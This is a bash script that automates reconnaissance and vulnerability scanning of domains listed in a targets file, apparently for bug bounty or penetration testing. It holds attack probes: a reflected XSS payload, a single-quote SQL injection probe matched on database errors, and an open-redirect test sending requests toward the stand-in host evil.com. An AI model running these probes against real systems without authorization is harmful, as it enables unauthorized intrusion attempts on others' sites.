#!/bin/bash

GREEN="\033[0;32m"
YELLOW="\033[1;33m"
NC="\033[0m"

TARGETS="targets.txt"

mkdir -p recon/{subs,alive,urls,params}
mkdir -p vulns/{xss,sqli,redirects,graphql}
mkdir -p secrets
mkdir -p infra

for domain in $(cat $TARGETS); do

echo -e "${YELLOW}Recon para $domain${NC}"

# ---------------------------------
# SUBDOMAIN ENUMERATION
# ---------------------------------

echo -e "${GREEN}Subdomain discovery${NC}"

subfinder -d $domain -silent > recon/subs/$domain.txt
assetfinder --subs-only $domain >> recon/subs/$domain.txt

sort -u recon/subs/$domain.txt > recon/subs/$domain-final.txt

# ---------------------------------
# ALIVE HOSTS
# ---------------------------------

httpx -l recon/subs/$domain-final.txt -silent > recon/alive/$domain.txt

# ---------------------------------
# URL DISCOVERY
# ---------------------------------

gau $domain > recon/urls/$domain.txt
waybackurls $domain >> recon/urls/$domain.txt

katana -list recon/alive/$domain.txt -silent >> recon/urls/$domain.txt

sort -u recon/urls/$domain.txt > recon/urls/$domain-final.txt

# ---------------------------------
# PARAMETER DISCOVERY
# ---------------------------------

grep "=" recon/urls/$domain-final.txt > recon/params/$domain.txt

# ---------------------------------
# XSS SCAN
# ---------------------------------

cat recon/params/$domain.txt \
| qsreplace "<script>alert(1)</script>" \
| httpx -silent -mr "<script>alert(1)</script>" \
> vulns/xss/$domain.txt

# ---------------------------------
# SQLI CHECK
# ---------------------------------

cat recon/params/$domain.txt \
| qsreplace "'" \
| httpx -silent \
-mr "SQL syntax|mysql_fetch|ORA-[0-9]{5}" \
> vulns/sqli/$domain.txt

# ---------------------------------
# OPEN REDIRECT
# ---------------------------------

grep -E "redirect=|url=|dest=" recon/params/$domain.txt \
| while read url; do
curl -s -L -o /dev/null -w "%{url_effective}" "$url//evil.com" \
| grep -q "evil.com" && echo "$url" >> vulns/redirects/$domain.txt
done

# ---------------------------------
# GRAPHQL DISCOVERY
# ---------------------------------

grep -E "graphql|gql|query|api" recon/urls/$domain-final.txt \
> vulns/graphql/$domain.txt

done
